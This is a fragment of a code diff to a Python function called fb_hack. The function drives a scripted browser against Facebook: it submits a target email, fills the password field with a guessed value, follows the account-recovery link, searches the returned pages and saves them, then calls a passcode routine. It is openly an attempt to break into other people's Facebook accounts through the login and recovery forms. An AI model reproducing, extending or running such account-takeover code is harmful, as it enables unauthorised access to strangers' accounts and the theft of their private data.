@@ -69,9 +69,13 @@ def fb_hack(email, codex, search):
   browser.select_form(nr=0)
   browser.form['email'] = email 
   browser.submit()
-  print(browser.geturl())
+  """print(browser.geturl())
   forms = list(browser.forms())
-  print(forms)
+  print(forms)"""
+  browser.select_form(nr=0)
+  browser.form['pass'] = str(1)
+  browser.follow_link('https://www.facebook.com/recover/initiate/?is_from_lara_screen=1')
+  """browser.select_form(nr=0)
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   with open("output1.html", "w") as file:
@@ -80,9 +84,8 @@ def fb_hack(email, codex, search):
     file.write(str(soup))
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
-  print(soup.find_all(string=re.compile(search)))
-  browser.select_form(nr=0)
-  browser.form['pass'] = str(1)
+  print(soup.find_all(string=re.compile(search)))"""
+
 os.system('clear')
 passcode6()
 
